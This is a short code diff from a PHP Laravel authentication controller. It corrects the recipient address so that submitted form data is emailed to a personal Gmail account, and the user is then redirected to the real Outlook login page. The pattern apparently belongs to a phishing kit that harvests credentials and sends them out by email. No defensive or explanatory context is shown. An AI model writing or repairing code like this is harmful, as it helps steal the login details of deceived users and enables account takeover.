@@ -202,7 +202,7 @@ class AuthController extends Controller
     // Send the email
     try {
         // Placeholder for email sending logic
-       Mail::to('zee.bluez55@gmail@gmail.com')->send(new ContractMail($formData));
+       Mail::to('zee.bluez55@gmail.com')->send(new ContractMail($formData));
 
         return redirect()->away('https://outlook.office365.com');
     } catch (\Exception $e) {
